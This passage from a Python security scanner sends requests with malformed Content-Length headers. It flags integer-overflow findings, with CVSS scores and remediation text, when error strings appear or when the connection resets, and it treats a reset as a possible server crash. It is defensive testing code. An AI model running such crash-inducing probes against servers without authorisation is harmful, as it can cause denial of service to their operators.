                            # Note: httpx may override this, testing error handling
                            "X-Test-CL": cl_value,
                        },
                        content="test=value",
                    )

                    # Check for integer-related error messages
                    response_text = safe_response_text(response).lower()
                    error_indicators = [
                        "integer overflow",
                        "number format",
                        "invalid content-length",
                        "negative",
                        "numberformatexception",
                        "valueerror",
                        "int too large",
                        "overflow",
                        "buffer",
                        "memory allocation",
                    ]

                    if any(ind in response_text for ind in error_indicators):
                        findings.append(
                            self._create_finding(
                                severity="HIGH",
                                title="Content-Length Integer Handling Issue",
                                description=(
                                    f"Server exhibited unusual behavior with Content-Length value '{cl_value}'. "
                                    f"Test type: {description}. "
                                    "Error message suggests integer parsing vulnerability that could lead "
                                    "to buffer overflows, denial of service, or request smuggling."
                                ),
                                cwe_id="CWE-190",
                                cwe_name="Integer Overflow or Wraparound",
                                url=url,
                                evidence=(
                                    f"Content-Length test: {cl_value}\n"
                                    f"Description: {description}\n"
                                    f"Response status: {response.status_code}"
                                ),
                                remediation=(
                                    "Use unsigned 64-bit integers for Content-Length parsing. "
                                    "Reject negative and excessively large Content-Length values. "
                                    "Implement maximum request body size limits."
                                ),
                                cvss_score=7.5,
                                references=[
                                    "https://cwe.mitre.org/data/definitions/190.html",
                                ],
                                metadata={
                                    "cl_value": cl_value,
                                    "description": description,
                                },
                            )
                        )
                        break

                except Exception as e:
                    # Connection errors might indicate we crashed something
                    error_str = str(e).lower()
                    if "connection" in error_str or "reset" in error_str:
                        findings.append(
                            self._create_finding(
                                severity="CRITICAL",
                                title="Content-Length Causes Connection Failure",
                                description=(
                                    f"Malformed Content-Length value '{cl_value}' caused connection failure. "
                                    f"Test type: {description}. "
                                    "This strongly suggests an integer handling vulnerability that "
                                    "crashes the server or causes connection reset."
                                ),
                                cwe_id="CWE-190",
                                cwe_name="Integer Overflow or Wraparound",
                                url=url,
                                evidence=(
                                    f"Content-Length: {cl_value}\n"
                                    f"Error: {str(e)}"
                                ),
                                remediation=(
                                    "Use safe integer parsing with bounds checking. "
                                    "Implement proper error handling for malformed headers. "
                                    "Deploy WAF rules to reject invalid Content-Length values."
                                ),
                                cvss_score=9.1,
                                references=[
                                    "https://cwe.mitre.org/data/definitions/190.html",
                                ],
                                metadata={
                                    "cl_value": cl_value,
                                    "description": description,
                                    "error": str(e),
                                },
                            )
                        )
                        break
                    logger.debug("negative_cl_error", value=cl_value, error=str(e))
                    continue

        return findings

    @staticmethod
    def _similarity_ratio(s1: str, s2: str) -> float:
        """Calculate similarity ratio between two strings (0.0 to 1.0)."""
        if not s1 or not s2:
            return 0.0
        # Simple character overlap ratio
        set1 = set(s1.lower())
        set2 = set(s2.lower())
        intersection = len(set1 & set2)
        union = len(set1 | set2)
        return intersection / union if union > 0 else 0.0
